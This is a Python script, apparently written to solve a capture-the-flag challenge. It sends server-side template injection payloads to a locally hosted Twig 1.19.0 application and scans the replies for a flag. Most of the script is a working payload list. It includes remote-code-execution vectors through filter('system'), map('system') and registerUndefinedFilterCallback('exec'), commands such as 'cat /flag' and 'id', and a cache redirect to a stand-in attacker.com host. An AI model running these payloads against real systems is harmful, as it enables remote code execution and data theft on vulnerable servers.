import requests
import re

BASE_URL = "http://127.0.0.1:8080/"

def test_ssti_payload(payload, description):
    """Test a single SSTI payload and analyze the response"""
    try:
        response = requests.post(
            BASE_URL,
            data={'name': payload},
            timeout=10
        )
        
        result = {
            'payload': payload,
            'description': description,
            'status': response.status_code,
            'length': len(response.text),
            'response': response.text
        }
        
        return result
    except Exception as e:
        return {
            'payload': payload,
            'description': description,
            'error': str(e)
        }

# Test payloads organized by category
test_cases = [
    # Category 1: Known valid article names with SSTI payloads
    ("laptop{{7*7}}", "Valid article + basic math expression"),
    ("{{7*7}}laptop", "Basic math expression + valid article"),
    ("laptop{{7*7}}laptop", "Valid article wrapped around math expression"),
    ("default{{7*7}}", "Default article + basic math expression"),
    
    # Category 2: Basic SSTI detection payloads
    ("{{7*7}}", "Basic multiplication - should return 49"),
    ("{{7*'7'}}", "String multiplication - should return 7777777"),
    ("{{'a'.upper()}}", "String method - should return A"),
    ("{{['id']|filter('system')}}", "RCE attempt via filter (older Twig)"),
    
    # Category 3: Twig-specific object access
    ("{{_self.env}}", "Access template environment object"),
    ("{{_self.env.getGlobals()}}", "Get global variables from environment"),
    ("{{attribute(_self,'env')}}", "Access env via attribute function"),
    
    # Category 4: Additional Twig exploitation vectors
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}", "Register exec as filter"),
    ("{{_self.env.registerUndefinedFilterCallback('system')}}", "Register system as filter"),
    ("{{['cat /flag']|filter('system')}}", "Attempt to read /flag file"),
    ("{{['ls -la']|filter('system')}}", "Attempt directory listing"),
    ("{{_self.env.enableDebug()}}", "Enable debug mode"),
    ("{{dump(_self)}}", "Dump self object"),
    ("{{_self}}", "Access self object directly"),
    
    # Category 5: Twig 1.x specific RCE vectors
    ("{{_self.env.setCache('ftp://attacker.com')}}", "Cache manipulation"),
    ("{{_self.env.loadTemplate('arbitrary')}}", "Load arbitrary template"),
    ("{{_self.env.getFilter('map')}}", "Get map filter"),
    
    # Category 6: Method chaining for RCE
    ("{{['id']|map('system')}}", "Map filter with system"),
    ("{{{'id':['id']}|map('system')}}", "Map with array"),
    ("{{[0]|reduce((a,b)=>'system'('id'))}}", "Reduce with system call"),
]

print("[*] Starting SSTI testing on Twig 1.19.0")
print("[*] Target: " + BASE_URL)
print("=" * 80)

# Baseline test with known valid article
print("\n[BASELINE] Testing with known valid article 'laptop':")
baseline = test_ssti_payload("laptop", "Baseline - valid article")
print(f"Status: {baseline['status']} | Length: {baseline['length']}B")
print(f"Response: {baseline['response']}\n")

# Track interesting results
interesting_results = []
flag_found = False

print("\n[TESTING] Executing SSTI payloads...")
print("=" * 80)

for payload, description in test_cases:
    result = test_ssti_payload(payload, description)
    
    if 'error' in result:
        print(f"\n[ERROR] {description}")
        print(f"Payload: {payload}")
        print(f"Error: {result['error']}")
        continue
    
    # Check for FLAG pattern
    flag_match = re.search(r'FLAG\{[^}]+\}', result['response'])
    if flag_match:
        flag_found = True
        print(f"\n[!!!!! FLAG FOUND !!!!!]")
        print(f"Description: {description}")
        print(f"Payload: {payload}")
        print(f"Status: {result['status']} | Length: {result['length']}B")
        print(f"Flag: {flag_match.group(0)}")
        print(f"Full Response:\n{result['response']}")
        interesting_results.append(result)
        continue
    
    # Detect template evaluation
    is_interesting = False
    reason = []
    
    # Check if response differs from baseline significantly
    if result['response'] != baseline['response'] and result['response'] != "default is in stock":
        is_interesting = True
        reason.append("Response differs from baseline")
    
    # Check for evaluated math expressions
    if '49' in result['response'] and '{{7*7}}' in payload:
        is_interesting = True
        reason.append("Math expression evaluated (7*7=49)")
    
    if '7777777' in result['response'] and "7*'7'" in payload:
        is_interesting = True
        reason.append("String multiplication evaluated")
    
    # Check for uppercase evaluation
    if payload == "{{'a'.upper()}}" and 'A' in result['response']:
        is_interesting = True
        reason.append("String method executed")
    
    # Check for object/method indicators
    if any(indicator in result['response'].lower() for indicator in ['object', 'twig', 'environment', 'array', 'closure']):
        is_interesting = True
        reason.append("Object/method output detected")
    
    # Check for error messages that indicate template processing
    if any(err in result['response'].lower() for err in ['twig', 'template', 'syntax error', 'unexpected', 'parse error']):
        is_interesting = True
        reason.append("Template error message")
    
    # Print result
    if is_interesting:
        print(f"\n[INTERESTING] {description}")
        print(f"Payload: {payload}")
        print(f"Status: {result['status']} | Length: {result['length']}B")
        print(f"Reason: {', '.join(reason)}")
        print(f"Response: {result['response']}")
        interesting_results.append(result)
    else:
        # Just show brief status for non-interesting results
        print(f"[.] {description[:50]:<50} | Status: {result['status']} | Len: {result['length']}B")

print("\n" + "=" * 80)
print(f"[SUMMARY] Testing complete")
print(f"Total payloads tested: {len(test_cases)}")
print(f"Interesting results: {len(interesting_results)}")
print(f"FLAG found: {flag_found}")

if interesting_results and not flag_found:
    print("\n[INTERESTING PAYLOADS SUMMARY]")
    for i, result in enumerate(interesting_results, 1):
        print(f"\n{i}. {result['description']}")
        print(f"   Payload: {result['payload']}")
        print(f"   Response snippet: {result['response'][:100]}...")

if not flag_found:
    print("\n[*] No FLAG found yet. May need to try additional exploitation techniques.")

